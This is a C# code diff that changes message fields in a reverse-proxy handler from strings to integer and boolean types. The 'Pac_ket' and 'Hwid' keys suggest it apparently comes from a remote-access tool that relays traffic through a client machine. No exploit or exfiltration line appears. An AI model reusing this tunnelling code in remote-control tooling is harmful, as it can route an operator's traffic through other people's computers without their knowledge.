@@ -51,10 +51,10 @@ namespace ReverseProxy.Handler
                     msgpack.ForcePathObject("Pac_ket").AsString = "reverseProxy";
                     msgpack.ForcePathObject("Option").AsString = "ReverseProxyConnectResponse";
                     msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
-                    msgpack.ForcePathObject("ConnectionId").AsString = ConnectionId.ToString();
-                    msgpack.ForcePathObject("IsConnected").AsString = "false";
+                    msgpack.ForcePathObject("ConnectionId").AsInteger = ConnectionId;
+                    msgpack.ForcePathObject("IsConnected").SetAsBoolean(false);
                     msgpack.ForcePathObject("LocalAddress").SetAsBytes(null);
-                    msgpack.ForcePathObject("LocalPort").AsString = "0";
+                    msgpack.ForcePathObject("LocalPort").AsInteger = 0;
                     msgpack.ForcePathObject("HostName").AsString = Target;
                     Connection.Send(msgpack.Encode2Bytes());
 
@@ -66,10 +66,10 @@ namespace ReverseProxy.Handler
                 msgpack1.ForcePathObject("Pac_ket").AsString = "reverseProxy";
                 msgpack1.ForcePathObject("Option").AsString = "ReverseProxyConnectResponse";
                 msgpack1.ForcePathObject("Hwid").AsString = Connection.Hwid;
-                msgpack1.ForcePathObject("ConnectionId").AsString = ConnectionId.ToString();
-                msgpack1.ForcePathObject("IsConnected").AsString = "true";
+                msgpack1.ForcePathObject("ConnectionId").AsInteger = ConnectionId;
+                msgpack1.ForcePathObject("IsConnected").SetAsBoolean(true);
                 msgpack1.ForcePathObject("LocalAddress").SetAsBytes(localEndPoint.Address.GetAddressBytes());
-                msgpack1.ForcePathObject("LocalPort").AsString = localEndPoint.Port.ToString();
+                msgpack1.ForcePathObject("LocalPort").AsInteger = localEndPoint.Port;
                 msgpack1.ForcePathObject("HostName").AsString = Target;
                 Connection.Send(msgpack1.Encode2Bytes());
             }
@@ -79,10 +79,10 @@ namespace ReverseProxy.Handler
                 msgpack1.ForcePathObject("Pac_ket").AsString = "reverseProxy";
                 msgpack1.ForcePathObject("Option").AsString = "ReverseProxyConnectResponse";
                 msgpack1.ForcePathObject("Hwid").AsString = Connection.Hwid;
-                msgpack1.ForcePathObject("ConnectionId").AsString = ConnectionId.ToString();
-                msgpack1.ForcePathObject("IsConnected").AsString = "false";
+                msgpack1.ForcePathObject("ConnectionId").AsInteger = ConnectionId;
+                msgpack1.ForcePathObject("IsConnected").SetAsBoolean(false);
                 msgpack1.ForcePathObject("LocalAddress").SetAsBytes(null);
-                msgpack1.ForcePathObject("LocalPort").AsString = "0";
+                msgpack1.ForcePathObject("LocalPort").AsInteger = 0;
                 msgpack1.ForcePathObject("HostName").AsString = Target;
                 Connection.Send(msgpack1.Encode2Bytes());
             }
@@ -108,7 +108,7 @@ namespace ReverseProxy.Handler
                 msgpack1.ForcePathObject("Pac_ket").AsString = "reverseProxy";
                 msgpack1.ForcePathObject("Option").AsString = "ReverseProxyData";
                 msgpack1.ForcePathObject("Hwid").AsString = Connection.Hwid;
-                msgpack1.ForcePathObject("ConnectionId").AsString = ConnectionId.ToString();
+                msgpack1.ForcePathObject("ConnectionId").AsInteger = ConnectionId;
                 msgpack1.ForcePathObject("Data").SetAsBytes(payload);
                 Connection.Send(msgpack1.Encode2Bytes());
             }
@@ -139,7 +139,7 @@ namespace ReverseProxy.Handler
                 msgpack.ForcePathObject("Pac_ket").AsString = "reverseProxy";
                 msgpack.ForcePathObject("Option").AsString = "ReverseProxyDisconnect";
                 msgpack.ForcePathObject("Hwid").AsString = Connection.Hwid;
-                msgpack.ForcePathObject("ConnectionId").AsString = ConnectionId.ToString();
+                msgpack.ForcePathObject("ConnectionId").AsInteger = ConnectionId;
                 Connection.Send(msgpack.Encode2Bytes());
             }
 
